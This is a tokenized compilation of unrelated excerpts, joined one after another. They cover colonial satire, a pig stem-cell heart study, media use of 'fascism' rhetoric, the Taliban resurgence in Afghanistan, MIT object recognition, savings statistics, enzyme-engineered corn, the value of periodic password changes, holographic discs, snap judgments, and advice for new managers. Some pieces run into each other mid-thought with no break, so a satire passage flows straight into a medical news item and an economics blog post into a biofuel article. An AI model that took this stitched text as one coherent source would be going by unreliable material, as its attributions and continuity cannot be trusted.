Prerevolutionary America was rife with satirical pamphleteers , and even Benjamin Franklin , in his “ Rules by Which a Great Empire May Be Reduced to a Small One , ” lampooned the misadministration of the colonies .
And yet , when readers today experience the best satires of our past , editorial points that once took center stage now shuffle toward the wings .
Whether in the rueful parody of Mark Twain ’s “ War Prayer ” ( “ It was a time of great and exalting excitement ” ) , the wicked ironies of Ambrose Bierce ’s “ Devil ’s Dictionary ” ( “ Conversation , n . A fair for the display of the minor mental commodities , each exhibitor being too intent upon the arrangement of his own wares to observe those of his neighbor ” ) or even the mordant sarcasm of Dorothy Parker ’s “ Comment ” —
Final results of a study conducted at Johns Hopkins show that stem cell therapy can be used effectively to treat heart attacks , or myocardial infarction , in pigs .
In just two months , stem cells harvested from another pig's bone marrow and injected into the animal 's damaged heart restored heart function and repaired damaged heart muscle by 50 percent to 75 percent .
The Hopkins findings , first presented last fall at the 2004 Scientific Sessions of the American Heart Association , are to be published in the latest issue of the Proceedings of the National Academy of Sciences online the week of July 25 .
Two patients have already been enrolled at Hopkins in a Phase I clinical trial , which is designed to test the safety of injecting adult stem cells at varying doses in patients who have recently suffered a heart attack .
In total , 48 patients will participate in this study , which is happening at several sites across the country .
Results are not expected until mid-2006 .
" Ultimately , the goal is to develop a widely applicable treatment to repair and reverse the damage done to heart muscle that has been infarcted , or destroyed , after losing its blood supply , " says cardiologist Joshua Hare , M.D. , professor of medicine at The Johns Hopkins University School of Medicine and its Heart Institute , and senior author of the study and lead trial investigator .
" There is reason for optimism about these findings , possibly leading to a first - ever cure for heart attack in humans , " he says .
" If a treatment can be found for the damage done by a heart attack to heart muscle , then there is the potential to forestall the serious complications that traditionally result from a heart attack , including disturbances of heart rhythm that can lead to sudden cardiac death , and decreased muscle pumping function that can lead to congestive heart failure . "
The researchers are using a special kind of stem cell in an early stage of development , called adult mesenchymal stem cells , to avoid potential problems with immunosuppression , in which every human 's immune system might attack stem cells from sources other than itself .
Bone marrow adult stem cells do not have the same potential to develop into different organ tissues , as do embryonic stem cells , whose use is more controversial .

The aggressive new campaign by the administration of President George W. Bush to depict U.S. foes in the Middle East as “ fascists ” and its domestic critics as “ appeasers ” owes a great deal to steadily intensifying efforts by the right - wing press over the past several months to draw the same comparison .
The Rupert Murdoch - owned Fox News Network and The Weekly Standard , as well as the Washington Times , which is controlled by the Rev. Sun Myung Moon ’s Unification Church , and the neoconservative New York Sun , have consistently and with increasing frequency framed the challenges faced by Washington in the region in the context of the rise of fascism and Nazism in the 1930s , according to a search of the Nexis database by IPS .
All of those outlets , as well as two other right - wing U.S. magazines 
The National Review and The American Spectator  far outpaced their commercial rivals in the frequency of their use of key words and names , such as “ appeasement , ” “ fascism , ” and “ Hitler , ” particularly with respect to Iran and its controversial president , Mahmoud Ahmadinejad .
Nexis , for example , cited 56 uses of “ Islamofascist ” or “ Islamofascism ” in separate programs or segments aired by Fox News compared with 24 by CNN over the past year .
Even more striking , the same terms were used in 115 different articles or columns in the Washington Times , compared with only eight in the Washington Post over the same period , according to a breakdown by Nexis .
Similarly , the Washington Times used the words “ appease ” or “ appeasement ”  a derogatory reference to efforts by British Prime Minister Neville Chamberlain to avoid war with Nazi Germany before the latter ’s invasion of Poland  in 25 different articles or columns that dealt with alleged threats posed by Ahmadinejad , compared to six in the Post and only three in the New York Times .
Israel - centered neoconservatives and other hawks have long tried to depict foreign challenges to U.S. power as replays of the 1930s in order to rally public opinion behind foreign interventions and high defense budgets and against domestic critics .
During the Cold War , they attacked domestic critics of the Vietnam War and later the Ronald Reagan administration ’s “ contra war ” against Nicaragua  and even Israel ’s 1982 invasion of Lebanon  as “ isolationists ” and “ appeasers ” who failed to understand that their opposition effectively served the interests of an “ evil ” Soviet Union whose ambitions for world conquest were every bit as threatening and real as that of the Axis powers in World War II .
Known as “ the Good War , ” that conflict remains irresistible as a point of comparison for hawks caught up in more recent conflicts  from the first Gulf War when former President H.W. Bush compared Iraq ’s Saddam Hussein to Hitler ; to the Balkan wars when neoconservatives and liberal interventionists alike described Serbian leader Slobodan Milosevic in similar terms ; to the younger Bush ’s “ global war on terrorism ” ( GWOT ) , which he and his supporters have repeatedly tried to depict as the latest in a series of existential struggles against “ evil ” and “ totalitarians ” that began with World War II .
Given the growing public disillusionment not only with the Iraq war , but with Bush ’s handling of the larger GWOT as well  not to mention the imminence of the mid-term Congressional elections in November and the growing tensions with Ahmadinejad ’s Iran over its nuclear program  it is hardly surprising that both the administration and its hawkish supporters are trying harder than ever to identify their current struggles , including last month ’s conflict between Israel and Iran - backed Hezbollah , specifically with the war against “ fascism ” more than 60 years ago .
As noted by Associated Press ( AP ) this week , “ fascism ” or “ Islamic fascism , ” a phrase used by Bush himself two weeks ago and used to encompass everything from Sunni insurgents , al - Qaeda and Hamas to Shi’ite Hezbollah and Iran to secular Syria , has become the “ new buzzword ” for Republicans .
In a controversial speech Tuesday , Pentagon chief Donald Rumsfeld was even more direct , declaring that Washington faced a “ new type of fascism ” and , in an explicit reference to the failure of western countries to confront Hitler in the 1930s , assailing critics for neglecting “ history ’s lessons ” by “ believ ( ing ) that somehow vicious extremists can be appeased . ”
But Rumsfeld ’s remarks , which drew bitter retorts from leading Democrats , followed a well - worn path trod with increasing intensity by the neoconservative and right - wing media over the last year , according to the Nexis survey .
Significantly , it did not include the Wall Street Journal whose editorial pages have been dominated by neoconservative opinion , particularly analogies between the rise of fascism and the challenges faced by the U.S. in the Middle East , since 9/11 .
Thus , the Washington Times published 95 articles and columns that featured the words “ fascism ” or “ fascist ” and “ Iraq ” over the past year , twice as many as appeared in the New York Times during the same period .
More than half of the Washington Times ‘ articles were published in just the past three months  three times as many as appeared in the New York Times .
Similarly , the National Review led all magazines and journals with 66 such references over the past year , followed by 48 in The American Spectator , and 14 by The Weekly Standard .
Together , those three publications accounted for more than half of all articles with those words published by the more than three dozen U.S. periodicals catalogued by Nexis since last September .
The results were similar for “ appease ” or “ appeasement ” and “ Iraq . ”
Led by the Review , the same three journals accounted for more than half the articles ( 175 ) that included those words in some three dozen U.S. Magazines over the past year .
As for newspapers , the Washington Times led the list with 46 articles , 50 percent more than the New York Times which also had fewer articles than its crosstown neoconservative rival , the much - smaller New York Sun .
Searching on Nexis for articles and columns that included “ Iran ” and “ fascist ” or “ fascism , ” IPS found that the Sun and the Times topped the newspaper list by a substantial margin , as did the Review , the Spectator , and the Standard among the magazines and journals .
Nearly one - third of all such references over the past year were published in August , according to the survey .
Nexis , which also surveys the Canadian press , found that newspapers owned by CanWest Global Communications , a group that owns the country ’s Global Television Network , as well as the National Post , the Ottawa Citizen , and the Montreal Gazette and several other regional newspapers , were also among the most consistent propagators of the “ fascism ” paradigm and ranked far ahead of other Canadian outlets in the frequency with which they used key words , such as “ appeasement ” and “ fascist ” in connection with Iraq and Iran .
The group is run by members of the Asper family whose foreign policy views have been linked to prominent hardline neoconservatives here and the right - wing Likud Party in Israel .

LONDON – The Taliban have regained control over the southern half of Afghanistan and their frontline is advancing daily , a group closely monitoring the Afghan situation said in a report Tuesday .
The report on the reconstruction of Afghanistan marking the fifth anniversary of 9/11 is based on extensive field research in the critical provinces of Helmand , Kandahar , Herat , and Nangarhar .
“ The Taliban frontline now cuts halfway through the country , encompassing all of the southern provinces , ” the Senlis Council report says .
The Senlis Council is an international policy think tank with offices in Kabul , London , Paris , and Brussels .
The report from Senlis , which has reported extensively on Afghanistan over recent years , says also that “ a humanitarian crisis of starvation and poverty has gripped the south of the country . ”
The report blames “ the U.S. and UK - led failed counter - narcotics and military policies ” for this situation .
“ The subsequent rising levels of extreme poverty have created increasing support for the Taliban , who have responded to the needs of the local population , ” the report says .
“ We are seeing a humanitarian disaster , ” Emmanuel Reinert , executive director of The Senlis Council told IPS .
“ There are around Kandahar now camps with people starving , kids dying almost every day , and this is obviously used by the Taliban to regain the confidence of the people , and to regain control of the country . ”
The poppy - eradication program has been a disaster , he said .
“ It is a direct attack on the livelihood of the farmers , so there is a clear connection between the eradication and this humanitarian crisis .
All this is being used by the Taliban to say that when we were there we were maybe hard and cruel , but you could feed the family , now look what ’s going on .
They are more and more providing support , social services to the local population . ”
The U.S. - led nation - building efforts have failed because of “ ineffective and inflammatory military and counter - narcotics policies , ” the report says .
“ At the same time , there has been a dramatic under - funding of aid and development programs . ”
The disastrous policies could have created the very circumstances for the growth of terrorism that the United States set out to fight , the report says .
“ The U.S. policies in Afghanistan have recreated the safe haven for terrorism that the 2001 invasion aimed to destroy , ” Reinert said .
“ The reason that the international force is in Afghanistan for the last five years is to make sure that Afghanistan will never again be a safe haven for international terrorists , ” Reinert told IPS .
But the rise of the Taliban is still short of a rise in terrorism , he said .
“ Right now we can not say we see a lot of foreign elements ; we see the Taliban in Afghanistan , ” he said .
“ We see basically the neo -Talibans as they are called , they are Afghans , they are people from the communities , they are from the Pashtun tribes who have been fighting in the south for so many years .
In a way , it is a civil war which is being waged over there . ”
Hunger is leading to anger , the report says .
Lack of funding from the international community means the Afghan government and the United Nations World Food Program are unable to address Afghanistan ’s hunger crisis , the report says .
“ Despite appeals for aid funds , the U.S. - led international community has continued to direct the majority of aid funds toward military and security operations . ”
“ Five years after 9/11 , Afghanistan is still one of the poorest countries in the world , and there is a hunger crisis in the fragile southern part of the country , ” said Reinert ..
“ Remarkably , this vital fact seems to have been overlooked in funding and prioritization of the foreign policy , military , counter - narcotics , and reconstruction plans . ”
Consequently , the international community has lost the battle for the hearts and mind of the Afghan people , the report says .
The report warns of difficult conditions in makeshift , unregistered refugee camps of starving children and civilians displaced by counter - narcotics and bombing campaigns .
These camps also accommodate families who have left their home due to violence and fighting , the report says .
Some are there because their homes have been destroyed by coalition forces ’ interventions in the “ war on terror ” and the current heightened counter - insurgency operations , the report says .
“ Right from 2001 , the U.S. - led international community ’s priorities for Afghanistan were not in line with those of the Afghan population , ” said Reinert .
“ It is a classic military error : they did not properly identify the enemy . ”
The report says that military expenditure outpaces development and reconstruction spending by 900 percent 
$ 82.5 billion has been spent on military operations in Afghanistan since 2002 , compared to just $ 7.3 billion on development .
The large numbers of civilian casualties and deaths have also fueled resentment and mistrust of the international military presence , the report says .
There were 104 civilian casualties in Afghanistan in the month of July alone .
Faced with the return of the Taliban , the United States and the international community must immediately reassess the entire approach in Afghanistan , the report says .
“ Emergency poverty relief must now be the top priority , ” said Reinert .
“ Only then can we talk of nation - building and reconstruction . ”
The rise of the Taliban is rapid , he told IPS .
“ You can not make peace with the real command of the Taliban .
We have to attack the root cause of the growing power of the Taliban , which is poverty , the counter - narcotics policy , we have to cut the Taliban from their base so that they will become what they were five years ago , a very small group of isolated terrorists in a way , a group that was using terror .
That ’s not the case any more .
Now they are a large part of the population because of the failure of the development policy . ”
Reinert said that “ in a year we will have a situation where the legitimacy of the Kabul government will be weakened to a point where they will not be able to have the country stay together . ”

Object Recognition : MIT scientists have applied a computer model of how the brain processes visual information to a complex , real - world task : recognizing the objects in a busy street scene .
A couple of years ago I saw the same kind of demo at Redwood Neuroscience Institute , Jeff Hawkins ' Neuroscience gathering .
The demo concerned a street scene in Italy .
The institute has moved over to Berkeley - instead Numenta , Hawkins ' latest start - up has taken its place .
This kind of object recognition is quite a bit different from cognitivelabs.com , in case you 're wondering - numenta is kind of a successor to machine vision - rather than chronometrics , defined as " nerve conduction velocity " by Arthur Jensen , which could be considered a measure of the human OS relative to silicon / network mediation and also is sensitive to genetic factors .
( see the latest Cognitive Labs ' paper : advance abstract here ... " People have been talking about computers imitating the brain for a long time , " said Tomaso Poggio , the Eugene McDermott professor of brain and cognitive sciences and a member of the McGovern Institute for Brain Research at MIT .
" Our work is biologically inspired computer science , " said Poggio .
" We developed a model of the visual system that was meant to be useful for neuroscientists in designing and interpreting experiments but that also could be used for computer science , " said Thomas Serre , a postdoctoral associate in Poggio 's lab and lead author of a paper on the work in the March 2007 IEEE Transactions on Pattern Analysis and Machine Intelligence .
"
We chose street - scene recognition as an example because it has a restricted set of object categories , and it has practical social applications , " said Serre .
The IEEE paper describes how the team " showed " the model randomly selected images so that it could " learn " to identify commonly occurring features in real - word objects such as trees and people .
In so - called supervised training sessions , the model used those features to label by category examples of objects found in digital photographs of street scenes , such as buildings and cars .

I can think of seven wedges between the national net savings - investment rate as estimated by the National Income and Product Accounts and statistical estimates of the change in total measured household net worth :
There is a gap between the rate of return on the average investment made in a year and the cost of capital , which means that $ 1 of savings on average produces more than $ 1 of value .
The NIPA may well understate corporate savings and investment by counting a bunch of investments in organizational form as corporate operating expenses .
All of us free - ride on technological research and development , reaping where we do not sow , gathering where we do not scatter , and profiting where we do not save and invest .
Shifts in the distribution of income away from labor and toward capital increase measured household net worth -- which includes the increased expected future profits from capital -- but not true household net worth -- which also includes the decreased expected future wages of labor .
Declines in interest rates make the future more valuable relative to the present and so raise measured household net worth today -- which is measured in today 's dollars -- without any outward shift in the true consumption - possibilities frontier .
Government deficits that raise the debt lower national savings but not measured household net worth .
Good news about the future produces windfall gains and bad news windfall losses which alter this year 's household net worth without telling us much about over - all long - run accumulation trends .
I was sitting on the right end of an nine - person panel at the New School Friday morning http://www.cepa.newschool.edu/events/events_schwartz-lecture.htm#webcast.
Bob Solow was sitting on the left end -- Solow , Shapiro , Schwartz , Rohatyn , Kudlow , Kerrey , Kosterlitz , Hormats , DeLong .
Bob Solow expressed concern and worry over the declines in the U.S. savings rate over the past generation .
Larry Kudlow , in the middle of the panel , aggressively launched into a rant -- about how the NIPA savings rate was wrong , about how the right savings rate was the change in household net worth , about how there was no potential problem with America saving too little , that the economy was strong , and that that day 's employment report had been wonderful , and that Paul Krugman had predicted nine out of the last zero recessions , et cetera , et cetera , et cetera .
What is one to do ?
You watch a guy -- Bob Solow - - one of the smartest and most thoughtful people I know , having his intellectual impact neutralized by a guy -- Kudlow - - who really is n't in the intellectual inquiry business anymore .
Kudlow clearly has not thought through the biases and gaps in the household net worth number : if he had , there is no way he could say what he is saying .
On paper , in print , on the screen , one can point out that the employment report was anemic -- it was not a bloodletting by any means , but it was a bit disappointing .
On paper , in print , on the screen , one can say that there is reason to worry about the decline in housing demand and the possibility that it might trigger a recession .
On paper , in print , on the screen one can say that reasons ( 4 ) , ( 5 ) , and ( 6 ) pushing up measured household net worth are reasons to discount that statistic as misleading because they do not reflect any true increase in appropriately - defined wealth , that any increase in household net worth caused by ( 7 ) is a transitory phenomenon that tells us little about permanent saving and accumulation patterns , that ( 1 ) and ( 2 ) affect the level but not the trends of saving , and do not speak to Solow 's worry about the savings - investment rate 's decline , and thus that only reason ( 3 ) -- the effects of the now decade - long computer - and - communications real investment boom on our total wealth -- provides a reason to even begin to think about whether Bob Solow 's worries about declining savings as measured by the NIPA are at all overblown .
But there are ninety minutes for a panel with nine people on it .
To the audience it looks like two cocksure economists who disagree for incomprehensible reasons .
And my ten minute share will come too late to try to referee Solow - Kudlow in any fair , balanced , and effective way .
It 's an un-discourse situation : Kudlow does n't acknowledge - - may not know -- the flaws in his chosen statistic .
And I can't help wonder what Kudlow would be saying if a Democrat were president .
It 's an intellectual Gresham 's Law in action ...
What can I do ?
I can blog about it .
Diversa says that because its enzyme is derived from a heat - loving microbe , ethanol factories can operate at higher temperatures and under more acidic conditions , improving efficiency .
Some people in the biofuel industry question what the advantage is of having the enzyme in the corn rather than just buying the very similar amylase that Diversa is already selling .

While Syngenta ’s corn is meant for industrial use in the United States , it is almost inevitable that some of it will get into human and animal food supplies , including exports , because of cross-pollination or seed intermingling .
That is what happened in 2000 with Aventis CropScience ’s StarLink corn , which was approved only for animal use , yet ended up in human food , forcing recalls and disrupting exports .
To prevent such liability , Syngenta is seeking approval of the corn for human and animal food use , not only in the United States but in Europe , South Africa and elsewhere .
Syngenta says the amylase enzyme is safe , noting that these enzymes are found in saliva .
But Bill Freese of the Center for Food Safety , an advocacy group in Washington opposed to biotechnology crops , said that this particular amylase is from a little - studied exotic microbe and that some amylase induces allergy .
The Agriculture Department has asked Syngenta for more information on its application .
Regardless of what is done to corn , some experts say that starch alone will not provide enough ethanol .
The new frontier is to produce ethanol from cellulose , the fibrous material in all plants .
Cellulose is made of complex carbohydrates that can be broken down by enzymes into simpler sugars for fermenting into ethanol .

( This is an updated version of a contribution I made to the Educause security mailing list last week . )
In the practice of security we have accumulated a number of “ rules of thumb ” that many people accept without careful consideration .
Some of these get included in policies , and thus may get propagated to environments they were not meant to address .
It is also the case that as technology changes , the underlying ( and unstated ) assumptions underlying these bits of conventional wisdom also change .
The result is a stale policy that may no longer be effective …or possibly even dangerous .
Policies requiring regular password changes ( e.g. , monthly ) are an example of exactly this form of infosec folk wisdom .
From a high - level perspective , let me observe that one problem with any widespread change policy is that it fails to take into account the various threats and other defenses that may be in place .
Policies should always be based on a sound understanding of risks , vulnerabilities , and defenses .
“ Best practice ” is intended as a default policy for those who do n’t have the necessary data or training to do a reasonable risk assessment .
Consider the underlying role of passwords : authentication .
Good authentication is intended to support access control , accountability and ( in some cases ) accounting .
Passwords provide a cost - effective and user - familiar form of authentication .
However , they have a number of failure modes depending on where they are used and the threats arrayed against them .
Failure modes include disclosure , inference , exposure , loss , guessing , cracking , and snooping .
In the most general case , passwords ( such as the security numbers on credit cards , or mother ’s maiden name ) are not sufficiently secret and are simply too weak to use as strong authenticators .
I ’ll skip this case , although it is far too pervasive to actually ignore .
Disclosure is a systemic threat on the platforms involved , as well as in the operational methods used to generate and transmit the passwords .
This cannot be addressed through changing the password .
Instead , the methods used to generate and distribute passwords needs to be examined to ensure that the passwords are not disclosed to the wrong parties .
Most operating systems are currently designed so that passwords are not stored “ in the clear ” and this reduces the chance of disclosure .
Unfortunately , some 3rd- party applications ( including web - based systems ) fail to adequately guard the passwords as they are entered , stored , or compared , resulting in potential disclosure .
Another form of disclosure is when the holder of the password discloses the password on purpose .
This is an education and enforcement issue .
( Anecdote : at one location where a new policy was announced that passwords must be changed every month , a senior administrator was heard to moan “ Do you know how much time I ’m going to waste each month ensuring that everyone on my staff knows my new password ? ” )
Inference occurs when there is a pattern to the way the passwords are generated / chosen and thus can be inferred .
For instance , knowing that someone uses the same password with a different last character for each machine allows passwords to be inferred , especially if coupled with disclosure of one .
Another example is where generated passwords are employed and the generation algorithm is predictable .
Exposure is the case where accident or unintended behavior results in a sporadic release of a password .
As an example , think of someone accidentally typing her password as the user name in login , and it is captured in the audit trail .
Another example is when someone accidentally types his password during a demonstration and it is exposed on a projection screen to a class .
Loss is when someone forgets his or her password , or ( otherwise ) loses whatever is used to remind / recreate the password .
This introduces overhead to recover the password , and may induce the user to keep extra reminders / copies of the password around — leading to greater exposure — or to use more memorable passwords — leading to more effective guessing attacks .
It is also the case that frequent loss opens up opportunities for eavesdropping and social engineering attacks on the reset system as it becomes more frequently used : safeguards on reset may be relaxed because they introduce too much delay on a system under load .
Guessing is self - explanatory .
Guessing is limited to choices that can be guessed .
After a certain limited number of choices , the guessing can only transform into a cracking attempt .
Cracking is when an intermediate form of the password ( e.g. , an encrypted form stored in the authentication database ) is captured and attacked algorithmically , or where iterated attempts are made to generate the password algorithmically .
The efficacy of this approach is determined by the strength of the obfuscation used ( e.g. , encryption ) , the checks on bad attempts , and the power and scope of the resources brought to bear ( e.g. , parallel computing , multi-lingual databases ) .
Snooping ( eavesdropping ) is when someone intercepts a communication employing the password , either in cleartext or in some intermediate form .
The password is then extracted .
Network sniffing and keyloggers are both forms of snooping .
Various technical measures , such as network encryption , can help reduce the threat .
Now , looking back over those , periodic password changing really only reduces the threats posed by guessing , and by weak cracking attempts .
If any of the other attack methods succeed , the password needs to be changed immediately to be protected — a periodic change is likely to be too late to effectively protect the target system .
Furthermore , the other attacks are not really blunted by periodic password changes .
Guessing can be countered by enforcing good password selection , but this then increases the likelihood of loss by users forgetting the passwords .
The only remaining threat is that periodic changes can negate cracking attempts , on average .
However , that assumes that the passwords choices are appropriately random , the algorithms used to obfuscate them ( e.g. , encryption ) are appropriately strong , and that the attackers do not have adequate computing / algorithmic resources to break the passwords during the period of use .
This is not a sound assumption given the availability of large - scale bot nets , vector computers , grid computing , and so on — at least over any reasonable period of time .
In summary , forcing periodic password changes given today ’s resources is unlikely to significantly reduce the overall threat — unless the password is immediately changed after each use .
This is precisely the nature of one - time passwords or tokens , and these are clearly the better method to use for authentication , although they do introduce additional cost and , in some cases , increase the chance of certain forms of lost “ password . ”
So where did the “ change passwords once a month ” dictum come from ?
Back in the days when people were using mainframes without networking , the biggest uncontrolled authentication concern was cracking .
Resources , however , were limited .
As best as I can find , some DoD contractors did some back - of - the - envelope calculation about how long it would take to run through all the possible passwords using their mainframe , and the result was several months .
So , they ( somewhat reasonably ) set a password change period of 1 month as a means to defeat systematic cracking attempts .
This was then enshrined in policy , which got published , and largely accepted by others over the years .
As time went on , auditors began to look for this and ended up building it into their “ best practice ” that they expected .
It also got written into several lists of security recommendations .
This is DESPITE the fact that any reasonable analysis shows that a monthly password change has little or no end impact on improving security !
It is a “ best practice ” based on experience 30 years ago with non-networked mainframes in a DoD environment — hardly a match for today ’s systems , especially in academia !
The best approach is to determine where the threats are , and choose defenses accordingly .
Most important is to realize that all systems are not the same !
Some systems with very sensitive data should probably be protected with two - factor authentication : tokens and / or biometrics .
Other systems / accounts , with low value , can still be protected by plain passwords with a flexible period for change .
Of course , that assumes that the OS is strong enough to protect against overall compromise once a low - privilege account is compromised …. not always a good bet in today ’s operating environment !
And , btw , I ’ve got some accounts where I ’ve used the same password for several years with nary an incident .
But in the spirit of good practice , that ’s all I ’m going to say about the passwords , the accounts , or how I know they are still safe .
One of my favorite Dilbert cartoons ( from 9/10 / 05 ) ends with the pointy - haired boss saying “ ... and starting today , all passwords must contain letters , numbers , doodles , sign language and squirrel noises . ”
Sound familiar to anyone ?

There was a rumor for some time now , that a large capacity disc will be developed , but nothing on - topic has proven so yet .
Now , Hitachi - Maxell is planning to organize a showcase this week , and present to the open public their new 300 GB holographic CD’s .
It does seem like this is Science - Fiction , but I can assure you it ’s not .
We are all asking ourselves what would be the advantages and disadvantages of this removable media .
Within advantages , I could mention the transfer rate of 20 MB /s , the high capacity and the multitude of operations that could be fulfilled with the help of it , like large amounts of backups , uncompressed media ( movies and audio ) that could be easily edited later , and many many more .
Disadvantages ?
The price , of course .
It ’s expected that one holographic disc will cost somewhere between $ 100 and $ 125 , and the optical drive that will be able to operate them will go up to $ 15.000 !
And wait , there ’s more for the future .
In 2008 , InPhase plans a second - generation 800 GB rewritable optical disc with data transfer rates of about 80 MBbps , with plans to expand its capacity to 1.6TB by 2010 .
Amazing .
What do you think about the high capacity disks ?

The moment people enter a new classroom , job or any unfamiliar situation , they begin to formulate opinions and unconscious perceptions of the environment and the people around them , said Reginald Adams , Penn State professor of psychology .
" We 're told not to judge a book by its cover , but we do this spontaneously , " explained Adams .
" In fact , it 's quite an effort to undo the inferences that we make . "
Sometimes , in fact , those inferences are dead - on .
In the 1990s , psychologists Robert Rosenthal and Nalini Ambady -- who Adams later worked with at Harvard University -- conducted a study in which college students were asked to evaluate a professor 's teaching ability .
The students ' ratings were based solely on watching a muted 10 - second clip of that professor in front of a class .
Remarkably , these instant ratings substantially matched those given after an entire semester .
In other cases , however , such quick decisions may be misleading .
This is especially true , Adams said , when the evaluation is cross-cultural .
Nonverbal cues differ from culture to culture , he explained .
This is less true of basic emotions such as fear and surprise , he added , and more true of complex emotions like sarcasm and humility .
In a recent experiment , Adams and his colleagues at Kyoto University in Japan were able to show evidence that test subjects were more likely to accurately " read " complex mental states such as playfulness or skepticism in members of their own race or culture group .
In other words , Adams explained , Caucasian Americans recognized the facial characteristics of a particular emotion from photos of Caucasian American faces more easily than from Japanese faces .
Similarly , Japanese students , who were given photographs expressing the same emotions , better identified these emotions when they were reflected in Japanese faces .
This difficulty in translating across race and culture , Adams said , may contribute to the development of stereotypes , such as that all members of an outside group look alike .
One place where such barriers may have a particularly serious impact , he suggested , is within the criminal justice system , where eyewitness testimony may be greatly affected by defective memory , especially when a victim is asked to identify a criminal of a different race .
" The question is how many innocent people have been sent to jail because of a faulty first impression , " said Adams .
" Clearly that 's when snap judgments go completely awry . "
Adams and his colleagues are now faced with a new question :
Is it possible to train people to do a better job of evaluating people from outside their own group ?
The answer , he suggested , may have important implications for military strategy , academic exchange and even transnational business .
In general , Adams said , snap judgments are most accurate in situations where an expert is making a quick decision on a familiar topic based on past experience .
Therefore , it 's not surprising that college students , after developing perspective on instructors ' body language through numerous classes , were able to trust their intuition to rate an unfamiliar professor .
" Sometimes not thinking is important , " he explained .
" When your body seems to know before your mind , your mind seems to get in the way . "

The central mistake new managers make is egoism .
On the surface , the change is all about you : you ’ve been promoted , you have a new job title , you have a new office .
Perhaps you ’ve been waiting for this change for some time , while watching peers or friends get promotions , and now finally you feel you ’ve received the respect you ’ve earned .
Congratulations !
But be warned : how or why you became a manager has little to do with doing the job well .
The sooner you recognize how different success as a manager is from success as worker , the better off you ’ll be .
Good managers are rare ( how many have you had ? ) : so if you ’re new to the game , and would like to be a good one , this essay is for you .
Why managers are different
On the day your job title includes “ manager ” others depend on you .
They will look to you for leadership , guidance , or advice .
They may rely on you for career direction and job security .
You have more influence on their happiness , and success than most people in their lives .
All this is what makes the transition to management a challenge : even if you are currently the most important programmer , marketer , or designer in an organization , there are new stresses and responsibilities you ’ve never faced .
The psychology and responsibility of managing others is complex and should be taken seriously .
Part of the challenge is that the people who work for you are unlikely to fully understand what your job is like .
Like a parent or guardian you will be doing things on behalf of others that they may never know about or fully understand .
On occasion you will need to quietly take the heat for decisions they made , or pass on rewards that , if you were more selfish , you ’d keep to yourself .
You will be asked , on a daily basis , to make decisions that impact the lives of other people , without as much information or time as you need .
Mistakes will happen and you will be accountable for them .
Some of your best moves will be out of your team ’s view , and the positive impact you have wo n’t always be acknowledged .
Despite any pay raises or perks that come with the job , it ’s rare to be fully compensated , in financial terms , for the challenges and tough choices that will inevitably be yours .
However the upsides are equally high .
There are thrills in bringing a team together and making good things happen , at a scale larger than you can do alone .
When you finish a project you wo n’t just have one piece to feel proud of : you ’ll look at the work done by many people at share pride for the whole thing .
However , it ’s important to recognize the countless managers with heaps of fame or seniority who are categorically management failures : their teams hate them , their peers do n’t trust them , and their superiors loathe them .
Look around your organization : I ’m sure you know who they are .
Being a manager combines big challenges and opportunities and requires a maturity and perspective few have , which explains why many lousy managers remain in the corner office .
So remember this : one day , all of those bad managers were once like you and chose to take on their first management role .
If you read on , I can help you to avoid their fate .
Getting started
Make a list of the previous managers you ’ve had .
Go back as far as you like : think of summer jobs , chores you did for your parents , and if your career is long enough , consider the professional bosses you ’ve had over the years .
For each manager make a bulleted list of the things they did well , and things they did n’t .
Build a map for yourself , based on your own experiences being managed , on the kinds of things the better managers in your experience have done .
Did they treat you in a certain way ?
How did they make you feel about your work ?
Did they teach you things ?
How did they earn your trust ( or not ) ?
How did they show respect or disrespect to you as a person ?
What was their approach to giving you difficult feedback ?
Take your time with this : wander through your own memories and see what you find .
Talk to your peers and friends about their experiences , and roll them into your own .
This exercise is n’t just for kicks .
Refreshing yourself on your ( and your friends ) experiences working for others creates a guide to your behavior as a manager .
It gives you a vocabulary of management situations that loosely approximates management experience , even though you ’re a new manager .
Every time you need to take a management action , you ’ll have a sense for what kinds of behaviors better managers take ( as well as what tactics they avoid ) .
And perhaps most importantly , it surfaces any latent grudges you might be harboring about what bad managers have done to you ( and left beneath the surface , might drive you to repeat their bad behavior on someone else ) .
Why manage ?
The question of desire to manage is often skipped in the process of becoming a manager .
The sense of promotion , ego , and career growth in an organization is typically the driving force , and other considerations come last .
Common good reasons to become a manager include :
You ’re ready for more responsibility
You are interested in leading and teaching others
You ’ve excelled at a specific role and want to help others do the same
You like setting people up to succeed
Common Bad reasons include :
Because your boss said so To make your mother proud
To buy that new Maserati GranSport
To have less work to do ( it ’s rarely true )
To make people suffer in living hell forever
As a new manager , it is fair to say you want to try it out and see if it suits you .
But if that ’s your intention you need to be clear with yourself how , and when , you ’ll decide whether it suits you or not .
Few things are more frustrating than working for a manager who , after 3 years of indifferent mediocrity , still is n’t sure if he wants to manage people or not .
It ’s common in some organizations for people curious about management to manage interns , or external contractors , as those are stepping stones towards being a manager .
If you want a trial opportunity , ask for one .
But be clear on what you expect to get out of becoming a manager and clarify those reasons with your own boss before taking on a team of your own .
If you ’re already a manager it ’s never too late to write down your reasons : it will either reinforce your drive to do your job well or make you aware that it might be time to return to an individual contributor role .
The boss is not the center of the universe ( Micromanagement explained )
The stereotype we learn as children is that the manager , the boss , tells other people what to do , and yells at them when they do it wrong .
This does n’t work so well .
Few people enjoy being told what to do , and frankly , it ’s not so interesting to be a boss if everyone always does everything you say .
The stereotype fails because it ’s boss centric : the manager is the center of the work universe , when it should be the work .
The job of any manager is to make the best possible things happen .
A successful manger gets the best possible work from the team and contributes as much as possible to making their organization successful : any management tactics they employ are done with these goals in mind , rendering a boss centric universe counterproductive .
If you take this view of “ best possible things ” all kinds of clever and interesting approaches come to mind that would n’t be considered otherwise .
( For example , follow the logic : to get their best work , I need the best people .
To get the best people , I need to provide interesting work .
To provide interesting work I need to create clear , but challenging goals , delegate responsibility , and back them up when they need help . )
However the ego trap many managers fall into is that the only way to make good work happen is to place themselves in the center of everything : every decision , every task , every meeting .
This is the opposite of management : it ’s anti-management .
Instead of 5 people working at full speed , you have 5 people limited by the manager ’s speed in checking and re-checking every single tiny decision they make .
Micro-management , the need to control everything , is a fundamental failure of the management to control his bad habits , or to grow a team sufficiently skilled not to need so much of his involvement .
Learning how to delegate , the obvious way out of micro-management , is n’t easy .
Anyone who previously worked alone and took pride in their perfect work will struggle with assigning work to others .
But this is a trap , and a sign that the person is n’t ready to manage .
It ’s the giving away of work and gently guiding it , and the person doing the work , to quality results that is the core of what managers are supposed to do .
It ’s a two way process as the manager wo n’t always be right and wo n’t always know the best way to solve a particular challenge ( especially if the people reporting to the boss are talented ) .
